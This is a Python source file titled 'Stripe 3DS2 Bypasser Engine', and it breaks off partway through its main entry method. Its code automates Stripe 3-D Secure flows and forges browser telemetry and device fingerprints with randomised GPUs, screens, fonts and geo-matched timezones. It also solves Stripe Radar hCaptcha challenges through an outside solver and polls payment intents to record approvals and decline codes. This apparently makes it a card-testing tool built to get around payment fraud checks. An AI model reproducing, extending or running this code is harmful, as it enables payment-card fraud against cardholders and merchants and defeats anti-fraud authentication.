"""
Stripe 3DS2 Bypasser Engine (stripe_3ds_bypasser.py)
────────────────────────────────────────────────────
Native 3DS2 (fingerprint → authenticate nested browser[*] → CReq)
+ 3DS1 (redirect_to_url / ACS auto-post). Frictionless completer.
"""

import re
import json
import base64
import hashlib
import random
import asyncio
import html
from typing import Dict, Optional, Any
from urllib.parse import urlencode, urljoin
from curl_compat import ChromeSession

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)
STRIPE_JS_UA = "stripe.js/6b8c0a stripe-js-v3/basil"

GEO_TIMEZONES: Dict[str, list] = {
    "US": [240, 300, 360, 420, 480],
    "CA": [240, 300, 360, 420, 480],
    "GB": [0, -60],
    "DE": [-60, -120],
    "FR": [-60, -120],
    "NL": [-60, -120],
    "AU": [-600, -660],
    "SG": [-480],
    "JP": [-540],
    "BR": [180],
    "MX": [360, 420],
    "IT": [-60, -120],
    "ES": [-60, -120],
    "PL": [-60, -120],
    "SE": [-60, -120],
    "CH": [-60, -120],
    "AT": [-60, -120],
    "BE": [-60, -120],
    "IE": [0],
    "PT": [0, -60],
    "NZ": [-720, -780],
}

SCREEN_RESOLUTIONS = [
    (1920, 1080),
    (2560, 1440),
    (1536, 864),
    (1440, 900),
    (1366, 768),
]

_GPU_POOL = [
    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 4070 Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (AMD)~ANGLE (AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0)",
]

_CHALLENGE_MARKERS = (
    "challengeinfo",
    "verification code",
    "one time password",
    "challengevar",
    'transstatus":"c"',
    "transstatus='c'",
    'transstatus="c"',
    'name="challengedata"',
    "name='challengedata'",
    'id="challengeframe"',
    "id='challengeframe'",
    'class="challenge',
    "acs-challenge",
)


def _flatten(data: dict, prefix: str = "") -> dict:
    out = {}
    for k, v in data.items():
        key = f"{prefix}[{k}]" if prefix else k
        if isinstance(v, dict):
            out.update(_flatten(v, key))
        elif isinstance(v, bool):
            out[key] = "true" if v else "false"
        elif v is None:
            continue
        else:
            out[key] = str(v)
    return out


async def _text(resp) -> str:
    t = resp.text
    return await t() if callable(t) else t


async def _json(resp) -> Any:
    j = resp.json
    return await j() if callable(j) else j


def _html_challenge(html_text: str) -> bool:
    low = html_text.lower()
    if any(k in low for k in _CHALLENGE_MARKERS):
        return True
    if re.search(r'type=["\']password["\']', html_text, re.I) and not re.search(r"<form[^>]+action=", html_text, re.I):
        return True
    # Do not match generic "code" or "token" which hit CSRF / anti-forgery hidden inputs
    return bool(re.search(r'name=["\'](?:otp|passcode|challenge_code|sms_code)["\']', html_text, re.I))


def _parse_form(html_text: str, base_url: str = ""):
    action = None
    m = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html_text, re.I)
    if m:
        raw_action = html.unescape(m.group(1)).strip()
        # action="" or action="#" posts to current page URL (base_url)
        action = urljoin(base_url, raw_action) if (base_url and raw_action) else (raw_action or base_url)
    elif '<form' in html_text.lower():
        # Form exists without action attribute -> posts to current URL
        action = base_url
    fields = {}
    for tag in re.finditer(r"<input[^>]+>", html_text, re.I):
        t = tag.group(0)
        n = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
        v = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
        if n:
            val = html.unescape(v.group(1)) if v else ""
            fields[n.group(1)] = val
    return action, fields


class Stripe3DSBypasser:
    """Standalone 3DS completer for Stripe PaymentIntents / SetupIntents."""

    @classmethod
    def _build_browser_telemetry(
        cls,
        country_code: str = "US",
        user_agent: str = None,
        server_trans_id: str = None,
        profile: dict = None,
    ) -> tuple:
        prof = profile or {}
        cc = (country_code or prof.get("country_code") or "US").upper()
        # 0 is falsy in Python (e.g. GB/IE GMT = 0) — must check is not None
        tz_offset = prof.get("tz_offset") if prof.get("tz_offset") is not None else random.choice(GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"]))
        if prof.get("screen_width") and prof.get("screen_height"):
            width, height = int(prof["screen_width"]), int(prof["screen_height"])
        else:
            width, height = random.choice(SCREEN_RESOLUTIONS)
        ua = user_agent or prof.get("user_agent") or UA

        lang_map = {
            "DE": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
            "AT": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
            "FR": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
            "BE": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
            "ES": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
            "MX": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
            "IT": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
            "NL": "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7",
            "PL": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
            "JP": "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
            "BR": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        lang = prof.get("accept_language") or lang_map.get(cc, "en-US,en;q=0.9")
        primary_lang = lang.split(",")[0]
        accept_header = (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,image/apng,*/*;q=0.8"
        )

        telemetry = {
            "threeDSCompInd": "Y",
            "fingerprintAttempted": True,
            "challengeWindowSize": "05",
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": primary_lang,
            "browserColorDepth": "24",
            "browserScreenHeight": str(height),
            "browserScreenWidth": str(width),
            "browserTZ": str(tz_offset),
            "browserUserAgent": ua,
            "browserAcceptHeader": accept_header,
            "timeZoneOffset": tz_offset,
            "language": primary_lang,
            "colorDepth": 24,
            "screenHeight": height,
            "screenWidth": width,
            "userAgent": ua,
            "javaEnabled": False,
            "javascriptEnabled": True,
            "acceptHeader": accept_header,
        }
        if server_trans_id:
            telemetry["threeDSServerTransID"] = server_trans_id
        return telemetry, tz_offset, width, height, primary_lang, ua

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.b64encode(data).decode().rstrip("=").replace("+", "-").replace("/", "_")

    @staticmethod
    def _b64url_decode(s: str) -> bytes:
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * (-len(s) % 4)
        return base64.b64decode(s)

    @staticmethod
    def _as_id(val) -> str:
        if isinstance(val, str) and val:
            # Reject payment_intent, setup_intent, and payment_method IDs — they 400 on /v1/3ds2/authenticate
            if val.startswith(("pi_", "seti_", "pm_")):
                return ""
            return val
        if isinstance(val, dict):
            cand = val.get("id") or val.get("three_d_secure_2_source") or ""
            if cand and not str(cand).startswith(("pi_", "seti_", "pm_")):
                return str(cand)
        return ""

    @classmethod
    def _merge_sdk(cls, next_action: dict) -> dict:
        use_sdk = next_action.get("use_stripe_sdk") or {}
        if not isinstance(use_sdk, dict):
            use_sdk = {}
        stripe_js_block = use_sdk.get("stripe_js") or next_action.get("stripe_js") or {}
        if not isinstance(stripe_js_block, dict):
            stripe_js_block = {}
        tds2_src_block = use_sdk.get("three_d_secure_2_source") or next_action.get("three_d_secure_2_source") or {}
        if not isinstance(tds2_src_block, dict):
            tds2_src_block = {}
        legacy_block = next_action.get("three_ds_2_intent") or next_action.get("three_d_secure_2_intent") or {}
        if not isinstance(legacy_block, dict):
            legacy_block = {}
        challenge_block = use_sdk.get("three_ds_2_challenge") or next_action.get("three_ds_2_challenge") or {}
        if not isinstance(challenge_block, dict):
            challenge_block = {}
        return {**legacy_block, **tds2_src_block, **challenge_block, **stripe_js_block, **use_sdk}

    @classmethod
    def _stripe_headers(cls, profile: dict = None, json_accept: bool = False) -> dict:
        ua = (profile or {}).get("user_agent", UA)
        h = {
            "User-Agent": ua,
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Accept": "application/json" if json_accept else "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Stripe-Version": "2020-08-27",
        }
        return h

    @classmethod
    async def _post_method(cls, session, method_url: str, server_trans_id: str,
                           notify_url: str, profile: dict, screen_w: int, screen_h: int,
                           tz_offset: int, prim_lang: str):
        method_obj = {
            "threeDSServerTransID": server_trans_id,
            "threeDSMethodNotificationURL": notify_url,
        }
        method_json = json.dumps(method_obj, separators=(",", ":"))
        method_b64 = cls._b64url_encode(method_json.encode())
        ua = (profile or {}).get("user_agent", UA)
        hdr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        }
        html = ""
        current_method_url = method_url
        try:
            async with session.post(
                method_url,
                data=urlencode({"threeDSMethodData": method_b64}),
                headers=hdr,
                timeout=14,
                allow_redirects=True,
            ) as r:
                html = await _text(r)
                current_method_url = str(getattr(r, "url", method_url))
        except Exception as ex:
            print(f"[3DS] method URL error: {ex}")
            return

        device_fp_url = None
        m = re.search(r'submitDataAndForm\(["\']+(https?://[^"\']+/devicefingerprint)["\']', html)
        if m:
            device_fp_url = m.group(1)
        elif "safekey" in html.lower() or "deviceidentification" in html.lower():
            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
            if m_action:
                device_fp_url = urljoin(current_method_url, html.unescape(m_action.group(1)))
        if not device_fp_url:
            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
            if m_action and "fingerprint" in m_action.group(1).lower():
                device_fp_url = urljoin(current_method_url, html.unescape(m_action.group(1)))

        if device_fp_url:
            raw_seed = (profile or {}).get("fp_seed")
            seed = str(raw_seed) if raw_seed is not None else str(server_trans_id or "")
            h = hashlib.sha256(seed.encode()).hexdigest()
            gpu_choice = (profile or {}).get("gpu") or _GPU_POOL[int(h[16:18], 16) % len(_GPU_POOL)]
            cores = (profile or {}).get("hardware_concurrency") or (4, 8, 12, 16)[int(h[18:20], 16) % 4]
            mems = (profile or {}).get("device_memory") or (8, 16, 32)[int(h[20:22], 16) % 3]
            fonts = [
                "Arial", "Arial Black", "Arial Narrow", "Calibri", "Cambria",
                "Comic Sans MS", "Courier New", "Georgia", "Helvetica",
                "Impact", "Palatino", "Tahoma", "Times New Roman", "Trebuchet MS",
                "Verdana", "Segoe UI", "Franklin Gothic Medium", "Century Gothic",
            ]
            fp_payload = {
                "threeDSServerTransID": server_trans_id,
                "deviceFpResult": json.dumps({
                    "canvas": (profile or {}).get("canvas") or h[:16],
                    "webgl": gpu_choice,
                    "webglVendor": gpu_choice.split("~")[0] if "~" in gpu_choice else "Google Inc. (NVIDIA)",
                    "platform": "Win32",
                    "hardwareConcurrency": cores,
                    "deviceMemory": mems,
                    "screenWidth": screen_w,
                    "screenHeight": screen_h,
                    "screenColorDepth": 24,
                    "availableScreenWidth": screen_w,
                    "availableScreenHeight": screen_h - 40,
                    "innerWidth": screen_w,
                    "innerHeight": screen_h - 80,
                    "timezone": tz_offset,
                    "timezoneOffset": tz_offset,
                    "language": prim_lang,
                    "javaEnabled": False,
                    "cookiesEnabled": True,
                    "doNotTrack": None,
                    "plugins": [
                        "PDF Viewer", "Chrome PDF Viewer", "Chromium PDF Viewer",
                        "Microsoft Edge PDF Viewer", "WebKit built-in PDF",
                    ],
                    "fonts": fonts,
                    "touchSupport": {"maxTouchPoints": 0, "touchEvent": False, "touchStart": False},
                    "audio": (profile or {}).get("audio") or round(124.04348, 6),
                    "sessionStorage": True,
                    "localStorage": True,
                    "indexedDb": True,
                    "openDatabase": False,
                    "cpuClass": None,
                    "vendor": "Google Inc.",
                    "productSub": "20030107",
                }, separators=(",", ":")),
            }
            try:
                async with session.post(
                    device_fp_url,
                    data=urlencode(fp_payload),
                    headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua},
                    timeout=10,
                ) as fp_r:
                    if getattr(fp_r, "status", 200) not in (200, 201, 204):
                        print(f"[3DS] device FP {fp_r.status} {device_fp_url}")
            except Exception as fp_ex:
                print(f"[3DS] device FP error: {fp_ex}")

        if notify_url:
            try:
                async with session.post(
                    notify_url,
                    data=urlencode({"threeDSMethodData": method_b64}),
                    headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua},
                    timeout=6,
                ) as _:
                    pass
            except Exception:
                pass

    @classmethod
    async def _resolve_radar(cls, session, sdk_data: dict, client_secret: str,
                             pk_key: str, profile: dict, depth: int):
        try:
            import captcha_solver
        except Exception:
            return {"success": False, "status": "intent_confirmation_challenge", "radar_challenge": True}

        stripe_js = sdk_data.get("stripe_js") or {}
        if not isinstance(stripe_js, dict):
            stripe_js = {}
        site_key = str(
            sdk_data.get("site_key")
            or stripe_js.get("site_key")
            or "c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a"
        )
        rqdata = stripe_js.get("rqdata")
        pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else (sdk_data.get("id") or "")
        raw_vurl = stripe_js.get("verification_url") or f"/v1/payment_intents/{pi_id}/verify_challenge"
        v_url = f"https://api.stripe.com{raw_vurl}" if raw_vurl.startswith("/") else raw_vurl

        if not captcha_solver.has_any_solver_key():
            return {"success": False, "status": "intent_confirmation_challenge", "radar_challenge": True}

        token = await captcha_solver.solve_hcaptcha_enterprise(
            sitekey=site_key,
            pageurl="https://js.stripe.com",
            rqdata=rqdata,
        )
        if not token:
            return {"success": False, "status": "intent_confirmation_challenge", "radar_challenge": True}

        verify_body = {
            "key": pk_key,
            "client_secret": client_secret,
            "captcha_response": token,
        }
        try:
            async with session.post(
                v_url,
                data=urlencode(verify_body),
                headers=cls._stripe_headers(profile, json_accept=True),
                timeout=15,
            ) as vr:
                vj = await _json(vr)
        except Exception as ex:
            print(f"[3DS] radar verify error: {ex}")
            return {"success": False, "status": "intent_confirmation_challenge", "radar_challenge": True}

        vpi = vj.get("payment_intent") or vj
        vstat = vpi.get("status")
        if vstat in ("succeeded", "complete", "requires_capture"):
            return {"success": True, "status": vstat, "raw_response": vj}
        if vstat == "requires_payment_method":
            verr = (
                vpi.get("last_payment_error")
                or vpi.get("last_setup_error")
                or vj.get("last_payment_error")
                or vj.get("error")
                or {}
            )
            return {
                "success": False,
                "status": "declined",
                "decline_code": verr.get("decline_code") or verr.get("code") or "card_declined",
                "error": verr.get("message") or "Card declined",
                "raw_response": vj,
            }
        if vstat in ("requires_action", "requires_source_action"):
            new_na = vpi.get("next_action") or vj.get("next_action")
            new_cs = vpi.get("client_secret") or client_secret
            if new_na and isinstance(new_na, dict):
                if new_na.get("type") == "redirect_to_url":
                    red_url = (new_na.get("redirect_to_url") or {}).get("url")
                    return await cls._resolve_redirect_url(session, red_url, pi_id, new_cs, pk_key, profile, depth + 1)
                return await cls._resolve_3ds2_sdk(session, new_na, new_cs, pk_key, profile, depth + 1)
            return {"success": False, "status": vstat, "radar_cleared": True, "raw_response": vj}
        return {"success": False, "status": "intent_confirmation_challenge", "radar_challenge": True}

    @classmethod
    async def _authenticate(cls, session, source_id: str, client_secret: str,
                            pk_key: str, browser_info: dict, profile: dict) -> Optional[dict]:
        # live stripe.js: nested form keys, not json blobs
        auth_body = {
            "key": pk_key,
            "source": source_id,
            "client_secret": client_secret,
            "one_click_authn": "false",
            "payment_user_agent": STRIPE_JS_UA,
            "browser": {
                "fingerprintAttempted": True,
                "challengeWindowSize": "05",
                "threeDSCompInd": "Y",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": browser_info.get("browserLanguage"),
                "browserColorDepth": browser_info.get("browserColorDepth"),
                "browserScreenHeight": browser_info.get("browserScreenHeight"),
                "browserScreenWidth": browser_info.get("browserScreenWidth"),
                "browserTZ": browser_info.get("browserTZ"),
                "browserUserAgent": browser_info.get("browserUserAgent"),
                "browserAcceptHeader": browser_info.get("browserAcceptHeader"),
            },
        }
        if browser_info.get("threeDSServerTransID"):
            auth_body["browser"]["threeDSServerTransID"] = browser_info["threeDSServerTransID"]

        # Dual-write three_ds_2_response as a JSON string for older Basil builds
        auth_body["three_ds_2_response"] = json.dumps({
            "threeDSCompInd": "Y",
            "browser": auth_body["browser"],
        }, separators=(",", ":"))

        auth_headers = cls._stripe_headers(profile, json_accept=True)

        try:
            async with session.post(
                "https://api.stripe.com/v1/3ds2/authenticate",
                data=urlencode(_flatten(auth_body)),
                headers=auth_headers,
                timeout=14,
            ) as r:
                d = await _json(r)
        except Exception as ex:
            print(f"[3DS] authenticate network: {ex}")
            return None

        if not isinstance(d, dict):
            print(f"[3DS] authenticate non-json")
            return None
        if d.get("error"):
            print(f"[3DS] authenticate error: {d.get('error')}")
            return {"success": False, "status": "authenticate_error", "raw_response": d}
        return d

    @classmethod
    async def _resolve_3ds2_sdk(cls, session, next_action: dict,
                                client_secret: str, pk_key: str,
                                profile: dict = None, depth: int = 0) -> Optional[dict]:
        if depth > 2:
            print("[3DS] max recursion in _resolve_3ds2_sdk")
            return {"success": False, "status": "max_depth_exceeded"}

        sdk_data = cls._merge_sdk(next_action)
        sdk_type = sdk_data.get("type") or next_action.get("type") or ""

        if sdk_type == "intent_confirmation_challenge":
            return await cls._resolve_radar(session, sdk_data, client_secret, pk_key, profile, depth)

        server_trans_id = (
            sdk_data.get("three_ds_server_trans_id")
            or sdk_data.get("three_ds_2_server_trans_id")
            or sdk_data.get("server_transaction_id")
            or sdk_data.get("threeDSServerTransID")
        )
        ds = sdk_data.get("directory_server_information") or {}
        method_url = (
            sdk_data.get("three_ds_method_url")
            or sdk_data.get("methodURL")
            or sdk_data.get("method_url")
            or (ds.get("three_ds_method_url") if isinstance(ds, dict) else None)
        )
        notify_url = (
            sdk_data.get("three_ds_method_notification_url")
            or sdk_data.get("methodNotificationURL")
            or sdk_data.get("threeDSMethodNotificationURL")
            or "https://hooks.stripe.com/3ds2/fingerprint/complete"
        )

        pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else None
        country_code = (profile or {}).get("country_code", "US")
        user_agent = (profile or {}).get("user_agent", UA)
        browser_info, tz_offset, screen_w, screen_h, prim_lang, ua = cls._build_browser_telemetry(
            country_code=country_code,
            user_agent=user_agent,
            server_trans_id=server_trans_id,
            profile=profile,
        )

        _ch = sdk_data.get("three_ds_2_challenge")
        _ch_dict = _ch if isinstance(_ch, dict) else {}
        acs_url = sdk_data.get("acs_url") or _ch_dict.get("acs_url")
        creq = sdk_data.get("creq") or _ch_dict.get("creq")
        session_data = (
            sdk_data.get("three_ds_session_data")
            or sdk_data.get("threeDSSessionData")
            or _ch_dict.get("three_ds_session_data")
        ) or ""

        # fingerprint first when method URL is present (stripe_3ds2_fingerprint AND mixed shapes)
        if method_url and server_trans_id and sdk_type != "stripe_3ds2_challenge":
            await cls._post_method(
                session, method_url, server_trans_id, notify_url,
                profile or {}, screen_w, screen_h, tz_offset, prim_lang,
            )
            await asyncio.sleep(1.5)
            # Stripe parks the refreshed three_d_secure_2_source on the PI after method notify
            # Must re-fetch before authenticate — original sdk blob may have empty source
            if pi_id and client_secret:
                endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
                pi_url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}?client_secret={client_secret}&key={pk_key}"
                pi_hdr = cls._stripe_headers(profile, json_accept=True)
                pi_hdr.pop("Content-Type", None)
                try:
                    async with session.get(pi_url, headers=pi_hdr, timeout=10) as pi_r:
                        pi_fresh = await _json(pi_r)
                    if isinstance(pi_fresh, dict):
                        pi_obj = pi_fresh.get("payment_intent") or pi_fresh.get("setup_intent") or pi_fresh
                        stat = pi_obj.get("status")
                        if stat in ("succeeded", "complete", "requires_capture"):
                            return {"success": True, "status": stat, "raw_response": pi_fresh}
                        if stat == "requires_payment_method":
                            err = pi_obj.get("last_payment_error") or pi_obj.get("last_setup_error") or pi_fresh.get("error") or {}
                            return {
                                "success": False,
                                "status": "declined",
                                "decline_code": err.get("decline_code") or err.get("code") or "card_declined",
                                "error": err.get("message") or "Card declined",
                                "raw_response": pi_fresh,
                            }
                        fresh_na = pi_obj.get("next_action") or {}
                        fresh_sdk = cls._merge_sdk(fresh_na)
                        if fresh_sdk:
                            sdk_data = {**sdk_data, **fresh_sdk}
                            # also update acs/creq from refreshed shape
                            _ch2 = sdk_data.get("three_ds_2_challenge")
                            _ch2_dict = _ch2 if isinstance(_ch2, dict) else {}
                            acs_url = sdk_data.get("acs_url") or _ch2_dict.get("acs_url") or acs_url
                            creq = sdk_data.get("creq") or _ch2_dict.get("creq") or creq
                            session_data = (
                                sdk_data.get("three_ds_session_data")
                                or sdk_data.get("threeDSSessionData")
                                or _ch2_dict.get("three_ds_session_data")
                            ) or session_data
                except Exception as ex:
                    print(f"[3DS] PI refresh after method error: {ex}")

        source_id = (
            cls._as_id(sdk_data.get("three_d_secure_2_source"))
            or cls._as_id(sdk_data.get("source"))
            or cls._as_id(sdk_data.get("three_ds_2_intent_id"))
            or (cls._as_id(sdk_data.get("id")) if str(sdk_data.get("id") or "").startswith(("src_", "tdsrc_", "pi_3ds_")) else "")
        )

        auth_d = None
        if source_id and sdk_type != "stripe_3ds2_challenge":
            auth_d = await cls._authenticate(session, source_id, client_secret, pk_key, browser_info, profile)
            if auth_d and auth_d.get("success") is False and auth_d.get("status") == "authenticate_error":
                return auth_d
            if isinstance(auth_d, dict):
                status = auth_d.get("status") or auth_d.get("state")
                if status == "succeeded":
                    return {"success": True, "status": "succeeded", "raw_response": auth_d}
                na = auth_d.get("next_action") or {}
                ares = auth_d.get("ares") or auth_d.get("a_res") or {}
                trans = (ares.get("transStatus") or ares.get("trans_status") or "").upper()
                if trans == "Y" or status in ("succeeded", "requires_capture"):
                    return {"success": True, "status": status or "succeeded", "raw_response": auth_d}
                if isinstance(na, dict) and na:
                    if na.get("type") == "redirect_to_url":
                        return await cls._resolve_redirect_url(
                            session, (na.get("redirect_to_url") or {}).get("url"),
                            pi_id, client_secret, pk_key, profile, depth + 1,
                        )
                    inner = na.get("use_stripe_sdk") or na
                    inner_dict = inner if isinstance(inner, dict) else {}
                    if (na.get("type") in ("use_stripe_sdk", "stripe_3ds2_challenge")
                            or inner_dict.get("type") == "stripe_3ds2_challenge"
                            or inner_dict.get("acs_url") or inner_dict.get("creq")):
                        # challenge surfaced after fingerprint — fall into CReq
                        sdk_data = cls._merge_sdk(na if na.get("use_stripe_sdk") or na.get("type") else {"use_stripe_sdk": inner_dict})
                        _ch3 = sdk_data.get("three_ds_2_challenge")
                        _ch3_dict = _ch3 if isinstance(_ch3, dict) else {}
                        acs_url = sdk_data.get("acs_url") or _ch3_dict.get("acs_url") or acs_url
                        creq = sdk_data.get("creq") or _ch3_dict.get("creq") or creq
                        session_data = (
                            sdk_data.get("three_ds_session_data")
                            or sdk_data.get("threeDSSessionData")
                            or _ch3_dict.get("three_ds_session_data")
                        ) or session_data
                    elif na.get("type") == "use_stripe_sdk" or "use_stripe_sdk" in na:
                        return await cls._resolve_3ds2_sdk(session, na, client_secret, pk_key, profile, depth + 1)

        if acs_url and creq:
            creq_out = await cls._post_creq(session, acs_url, creq, session_data, profile)
            if creq_out and creq_out.get("challenge_required"):
                return creq_out
            if pi_id:
                return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile, depth=depth + 1)

        if pi_id:
            return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile, depth=depth + 1)
        return None


    @classmethod
    async def _post_creq(cls, session, acs_url: str, creq: str,
                         session_data: str, profile: dict) -> Optional[dict]:
        # send both field name variants — EMVCo says "creq", some ACS implementations want "CReq"
        body = {"creq": creq, "CReq": creq}
        if session_data:
            body["threeDSSessionData"] = session_data
        ua = (profile or {}).get("user_agent", UA)
        try:
            async with session.post(
                acs_url,
                data=urlencode(body),
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                },
                timeout=15,
                allow_redirects=True,
            ) as r:
                html = await _text(r)
                final_url = str(getattr(r, "url", acs_url))
        except Exception as ex:
            print(f"[3DS] CReq error: {ex}")
            return None

        if _html_challenge(html):
            print(f"[3DS] interactive challenge at {final_url}")
            return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": final_url}

        # frictionless ACS auto-posts CRes back to TermUrl / notification URL
        # pass final_url as base_url so relative form actions resolve correctly
        c_url, c_data = _parse_form(html, base_url=final_url)
        if c_url and c_data:
            try:
                async with session.post(
                    c_url,
                    data=urlencode(c_data),
                    headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua},
                    timeout=10,
                    allow_redirects=True,
                ) as _:
                    pass
            except Exception as ex:
                print(f"[3DS] CRes return error: {ex}")
        return {"success": None, "status": "creq_posted"}

    @classmethod
    async def _resolve_redirect_url(cls, session, redirect_url: str,
                                    pi_id: str, client_secret: str,
                                    pk_key: str, profile: dict = None,
                                    depth: int = 0) -> Optional[dict]:
        if not redirect_url:
            return None
        if depth > 2:
            print("[3DS] max recursion in _resolve_redirect_url")
            return {"success": False, "status": "max_depth_exceeded"}

        ua = (profile or {}).get("user_agent", UA)
        try:
            async with session.get(
                redirect_url,
                headers={"User-Agent": ua, "Accept": "text/html,*/*"},
                timeout=10,
                allow_redirects=True,
            ) as r:
                html = await _text(r)
                final_url = str(getattr(r, "url", redirect_url))

            if _html_challenge(html):
                print(f"[3DS] challenge on landing {final_url}")
                return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": final_url}

            acs_url, form_data = _parse_form(html, base_url=final_url)
            if not acs_url:
                m_url = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html)
                if m_url:
                    acs_url = urljoin(final_url, html.unescape(m_url.group(1)))

            if acs_url and form_data:
                async with session.post(
                    acs_url,
                    data=urlencode(form_data),
                    headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua},
                    timeout=10,
                    allow_redirects=True,
                ) as acs_res:
                    acs_html = await _text(acs_res)
                    acs_final = str(getattr(acs_res, "url", acs_url))
                    if _html_challenge(acs_html):
                        print(f"[3DS] interactive ACS {acs_final}")
                        return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": acs_final}
                    c_url, c_data = _parse_form(acs_html, base_url=acs_final)
                    if c_url and c_data:
                        async with session.post(
                            c_url,
                            data=urlencode(c_data),
                            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua},
                            timeout=10,
                            allow_redirects=True,
                        ) as _:
                            pass
        except Exception as ex:
            print(f"[3DS] redirect error: {ex}")

        return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile, depth=depth + 1)

    @classmethod
    async def _check_pi_status(cls, session, pi_id: str,
                               client_secret: str, pk_key: str,
                               profile: dict = None,
                               _reenter: bool = True,
                               depth: int = 0) -> Optional[dict]:
        if not pi_id or not client_secret:
            return None
        endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
        url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}?client_secret={client_secret}&key={pk_key}"
        hdr = cls._stripe_headers(profile, json_accept=True)
        hdr.pop("Content-Type", None)

        last_d = None
        for attempt in range(6):
            try:
                async with session.get(url, headers=hdr, timeout=10) as r:
                    d = await _json(r)
                    if isinstance(d, dict):
                        last_d = d
                        status = d.get("status")
                        if status in ("succeeded", "requires_capture"):
                            return {"success": True, "status": status, "raw_response": d}
                        if status == "requires_payment_method":
                            err = d.get("last_payment_error") or d.get("last_setup_error") or d.get("error") or {}
                            return {
                                "success": False,
                                "status": "declined",
                                "decline_code": err.get("decline_code") or err.get("code") or "card_declined",
                                "error": err.get("message") or "Card declined",
                                "raw_response": d,
                            }
                        if status not in ("processing", "requires_action"):
                            return {"success": False, "status": status, "raw_response": d}
            except Exception as ex:
                print(f"[3DS] PI poll #{attempt + 1}: {ex}")
            if attempt < 5:
                await asyncio.sleep(1.5)

        # Poll exhausted — if still requires_action, re-enter 3DS handler once on updated next_action (depth + 1)
        if isinstance(last_d, dict) and last_d.get("status") == "requires_action" and _reenter and depth < 2:
            pi_obj = last_d.get("payment_intent") or last_d.get("setup_intent") or last_d
            updated_na = pi_obj.get("next_action") or last_d.get("next_action")
            updated_cs = pi_obj.get("client_secret") or client_secret
            if updated_na and isinstance(updated_na, dict):
                act = updated_na.get("type", "")
                if act == "redirect_to_url":
                    red_url = (updated_na.get("redirect_to_url") or {}).get("url")
                    return await cls._resolve_redirect_url(
                        session, red_url, pi_id, updated_cs, pk_key, profile, depth=depth + 1)
                return await cls._resolve_3ds2_sdk(
                    session, updated_na, updated_cs, pk_key, profile, depth=depth + 1)

        if isinstance(last_d, dict):
            return {"success": False, "status": last_d.get("status", "unknown"), "raw_response": last_d}
        return {"success": False, "status": "pi_status_unreachable"}

    @classmethod
    async def resolve_3ds(cls, result: dict, proxy_data: Optional[dict] = None,
                          profile: Optional[dict] = None) -> dict:
        raw_res = result.get("raw_response") or {}
        if not isinstance(raw_res, dict):
            return result

        pi = raw_res.get("payment_intent") or raw_res.get("setup_intent") or raw_res
        if not isinstance(pi, dict):
            return result

        next_action = pi.get("next_action") or raw_res.get("next_action")
        client_secret = pi.get("client_secret") or raw_res.get("client_secret")
        pk_key = result.get("pk_key") or raw_res.get("pk_key") or ""

        if not pk_key or str(pk_key).endswith("placeholder"):
            result["3ds_attempted"] = False
            result["3ds_error"] = "missing or placeholder pk_key"
            return result
